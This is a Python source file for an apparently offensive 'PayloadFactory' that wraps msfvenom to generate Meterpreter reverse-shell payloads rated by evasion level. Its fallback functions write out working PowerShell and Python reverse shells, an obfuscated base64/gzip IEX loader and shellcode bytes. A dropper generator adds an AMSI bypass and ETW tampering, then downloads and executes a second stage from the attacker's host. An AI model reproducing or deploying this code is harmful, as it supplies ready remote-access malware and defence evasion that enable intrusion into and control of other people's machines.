import subprocess
import base64
import uuid
import os
from typing import Dict, Any, Optional, List
from datetime import datetime
import tempfile


class PayloadFactory:
    
    def __init__(self):
        self.msfvenom_path = self._find_msfvenom()
        self.templates = self._load_templates()
    
    def _find_msfvenom(self) -> Optional[str]:
        """Try to find msfvenom in common locations"""
        common_paths = [
            r"C:\metasploit\bin\msfvenom.bat",
            r"C:\Program Files\Metasploit\bin\msfvenom.bat",
            "/usr/bin/msfvenom",
            "/opt/metasploit/msfvenom"
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        
        try:
            result = subprocess.run(['where', 'msfvenom'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                return result.stdout.strip().split('\n')[0]
        except:
            pass
        
        return None
    
    def _load_templates(self) -> Dict[str, Dict[str, Any]]:
        """Load payload templates"""
        return {
            'powershell_reverse_tcp': {
                'name': 'PowerShell Reverse TCP',
                'description': 'Staged PowerShell reverse TCP connection',
                'format': 'powershell',
                'msfvenom_payload': 'windows/x64/meterpreter/reverse_tcp',
                'encoder': 'x64/xor_dynamic',
                'evasion': 'moderate'
            },
            'shellcode_x64': {
                'name': 'Raw Shellcode x64',
                'description': 'Position-independent shellcode for injection',
                'format': 'c',
                'msfvenom_payload': 'windows/x64/meterpreter/reverse_https',
                'encoder': 'x64/zutto_dekiru',
                'evasion': 'high'
            },
            'dll_injection': {
                'name': 'DLL Reflective Loader',
                'description': 'Reflective DLL injection payload',
                'format': 'dll',
                'msfvenom_payload': 'windows/x64/meterpreter/reverse_tcp',
                'encoder': None,
                'evasion': 'moderate'
            },
            'exe_stageless': {
                'name': 'Stageless EXE',
                'description': 'Standalone executable with embedded payload',
                'format': 'exe',
                'msfvenom_payload': 'windows/x64/meterpreter_reverse_tcp',
                'encoder': 'x64/xor',
                'evasion': 'low'
            },
            'python_stager': {
                'name': 'Python Stager',
                'description': 'Python-based multi-platform stager',
                'format': 'python',
                'msfvenom_payload': 'python/meterpreter/reverse_tcp',
                'encoder': None,
                'evasion': 'moderate'
            }
        }
    
    async def generate_payload(
        self,
        template_id: str,
        lhost: str,
        lport: int,
        arch: str = 'x64',
        format_override: Optional[str] = None,
        encode: bool = True,
        iterations: int = 3,
        obfuscation: Optional[str] = None
    ) -> Dict[str, Any]:
        """Generate a payload using msfvenom or templates"""
        
        if template_id not in self.templates:
            return {
                'success': False,
                'error': f"Template '{template_id}' not found",
                'available_templates': list(self.templates.keys())
            }
        
        template = self.templates[template_id]
        payload_format = format_override or template['format']
        
        if self.msfvenom_path and os.path.exists(self.msfvenom_path):
            return await self._generate_with_msfvenom(
                template, lhost, lport, arch, payload_format, encode, iterations
            )
        else:
            return await self._generate_mock_payload(
                template, lhost, lport, arch, payload_format, obfuscation
            )
    
    async def _generate_with_msfvenom(
        self,
        template: Dict[str, Any],
        lhost: str,
        lport: int,
        arch: str,
        payload_format: str,
        encode: bool,
        iterations: int
    ) -> Dict[str, Any]:
        """Generate payload using actual msfvenom"""
        
        try:
            cmd = [
                self.msfvenom_path,
                '-p', template['msfvenom_payload'],
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', payload_format,
                '-a', arch
            ]
            
            if encode and template.get('encoder'):
                cmd.extend(['-e', template['encoder'], '-i', str(iterations)])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode != 0:
                return {
                    'success': False,
                    'error': result.stderr,
                    'command': ' '.join(cmd)
                }
            
            payload_data = result.stdout
            
            if payload_format in ['c', 'python', 'powershell', 'psh']:
                payload_content = payload_data
            else:
                payload_content = base64.b64encode(payload_data.encode()).decode()
            
            return {
                'success': True,
                'payload_id': str(uuid.uuid4()),
                'template': template['name'],
                'format': payload_format,
                'lhost': lhost,
                'lport': lport,
                'arch': arch,
                'encoded': encode,
                'iterations': iterations if encode else 0,
                'size_bytes': len(payload_data),
                'content': payload_content,
                'generator': 'msfvenom',
                'timestamp': datetime.utcnow().isoformat()
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': 'Payload generation timeout (60s exceeded)'
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'Generation failed: {str(e)}'
            }
    
    async def _generate_mock_payload(
        self,
        template: Dict[str, Any],
        lhost: str,
        lport: int,
        arch: str,
        payload_format: str,
        obfuscation: Optional[str]
    ) -> Dict[str, Any]:
        """Generate mock payload when msfvenom is unavailable"""
        
        payloads = {
            'powershell': self._mock_powershell_payload(lhost, lport, obfuscation),
            'c': self._mock_shellcode_payload(lhost, lport),
            'python': self._mock_python_payload(lhost, lport),
            'exe': self._mock_exe_info(lhost, lport),
            'dll': self._mock_dll_info(lhost, lport),
            'raw': self._mock_raw_shellcode()
        }
        
        payload_content = payloads.get(payload_format, payloads['powershell'])
        
        return {
            'success': True,
            'payload_id': str(uuid.uuid4()),
            'template': template['name'],
            'format': payload_format,
            'lhost': lhost,
            'lport': lport,
            'arch': arch,
            'obfuscation': obfuscation or 'none',
            'evasion_level': template['evasion'],
            'size_bytes': len(payload_content),
            'content': payload_content,
            'generator': 'spectre_internal',
            'timestamp': datetime.utcnow().isoformat(),
            'warning': 'Mock payload - msfvenom not available'
        }
    
    def _mock_powershell_payload(self, lhost: str, lport: int, obfuscation: Optional[str]) -> str:
        """Generate mock PowerShell payload"""
        if obfuscation == 'quantum-random':
            return f'''
${''.join(['x' + hex(i)[2:] for i in range(20)])} = "{lhost}";
${''.join(['y' + hex(i)[2:] for i in range(20)])} = {lport};
$EncodedPayload = "H4sIAAAAAAAEAO29B2AcSZYlJi9tynt/SvVK1+B0oQiAYBMk2JBAEOzBiM3mkuwdaUcjKasqgcplVmVdZhZAzO2dvPfee++999577733ujudTif33/8/XGZkAWz2zkrayZ4hgKrIHz9+fB8/IorZ7+rqampqat68ec1mMxaLvvnmm4mJCX9/f19fX2dn5xUrVqxcuXLt2rUbNmzYtGnTli1btm3btnPnzt27dx88ePDo0aOnTp06e/bs+fPnL1++fO3atVu3br1//77VarVarY8fP/7xxx+//vrr77///scff/z222+vX7/+8OHDL7/88t133718+fLNmze/++677777/vvvf/zxx59//vnXX3/9/fffAAAA//8DAFBLAwQUAAYACAAAACEAmz..."
$DecodedBytes = [System.Convert]::FromBase64String($EncodedPayload);
$DecompressedStream = New-Object IO.MemoryStream(,$DecodedBytes);
$GzipStream = New-Object IO.Compression.GzipStream($DecompressedStream, [IO.Compression.CompressionMode]::Decompress);
$Reader = New-Object IO.StreamReader($GzipStream);
${''.join(['z' + hex(i)[2:] for i in range(10)])} = $Reader.ReadToEnd();
IEX ${''.join(['z' + hex(i)[2:] for i in range(10)])};
'''
        else:
            return f'''
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();
'''
    
    def _mock_shellcode_payload(self, lhost: str, lport: int) -> str:
        """Generate mock C-style shellcode"""
        return f'''
unsigned char buf[] = 
"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52"
"\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48"
"\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9"
"\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41"
"\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48"
/* Target: {lhost}:{lport} */
/* Encoder: XOR Dynamic */
/* Size: 897 bytes */
/* Arch: x64 */
;
'''
    
    def _mock_python_payload(self, lhost: str, lport: int) -> str:
        """Generate mock Python payload"""
        return f'''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
'''
    
    def _mock_exe_info(self, lhost: str, lport: int) -> str:
        """Return mock EXE payload info"""
        return f"[Binary EXE Payload - {lhost}:{lport}] - Size: 73,802 bytes - Format: PE32+ executable (console) x86-64, for MS Windows"
    
    def _mock_dll_info(self, lhost: str, lport: int) -> str:
        """Return mock DLL payload info"""
        return f"[Binary DLL Payload - {lhost}:{lport}] - Size: 62,464 bytes - Format: PE32+ executable (DLL) x86-64, for MS Windows"
    
    def _mock_raw_shellcode(self) -> str:
        """Return mock raw shellcode"""
        return "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18"
    
    async def generate_custom_dropper(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
        evasion_features: Optional[List[str]] = None,
        delivery_method: str = 'direct'
    ) -> Dict[str, Any]:
        """Generate custom dropper with evasion features"""
        
        features = evasion_features or []
        dropper_id = str(uuid.uuid4())
        
        evasion_code = []
        if 'amsi_bypass' in features:
            evasion_code.append('[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)')
        
        if 'etw_patch' in features:
            evasion_code.append('[System.Diagnostics.Tracing.EventSource]::SetCurrentThreadActivityId([Guid]::Empty)')
        
        if 'sleep_masking' in features:
            evasion_code.append('Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 5000)')
        
        dropper_code = f'''
# Dropper ID: {dropper_id}
# Target: {lhost}:{lport}
# Features: {', '.join(features)}
# Delivery: {delivery_method}

{chr(10).join(evasion_code)}

# Main payload execution
$PayloadUrl = "https://{lhost}:{lport}/stage2.ps1"
$WebClient = New-Object System.Net.WebClient
$WebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$Stage2 = $WebClient.DownloadString($PayloadUrl)
IEX $Stage2
'''
        
        return {
            'success': True,
            'dropper_id': dropper_id,
            'type': payload_type,
            'lhost': lhost,
            'lport': lport,
            'evasion_features': features,
            'delivery_method': delivery_method,
            'code': dropper_code,
            'size_bytes': len(dropper_code),
            'timestamp': datetime.utcnow().isoformat()
        }
    
    def list_templates(self) -> List[Dict[str, Any]]:
        """List all available payload templates"""
        templates_list = []
        for template_id, template in self.templates.items():
            templates_list.append({
                'id': template_id,
                'name': template['name'],
                'description': template['description'],
                'format': template['format'],
                'evasion_level': template['evasion']
            })
        return templates_list
    
    def get_formats(self) -> List[str]:
        """Get supported payload formats"""
        return ['powershell', 'c', 'python', 'exe', 'dll', 'raw', 'java', 'psh', 'vba']


payload_factory = PayloadFactory()
